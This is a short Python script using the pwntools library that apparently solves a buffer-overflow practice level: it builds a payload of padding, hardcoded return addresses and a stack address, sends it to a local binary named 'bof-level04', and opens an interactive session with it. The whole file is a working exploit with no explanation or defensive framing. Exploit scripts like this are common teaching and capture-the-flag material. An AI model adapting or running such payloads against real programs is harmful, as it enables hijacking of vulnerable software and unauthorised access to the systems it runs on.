from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

payload = 'aaaa' + '\x30\x85\x04\x08' + 'ccccddddeeee' + 'ABCDEFGH' + 'ffffgggg' + '\x6b\x87\x04\x08' + 'iiiijjjjkkkkllllmmmmnnnnoooo' + '\x30\x85\x04\x08' + 'qqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyy' + '\x70\xd4\xff\xff'

target = process('./bof-level04')
#target = process('./bof-level04', setuid=False)

#gdb.attach(target, 'b *receive_input')

target.recvline()

target.send(payload) 

target.interactive()
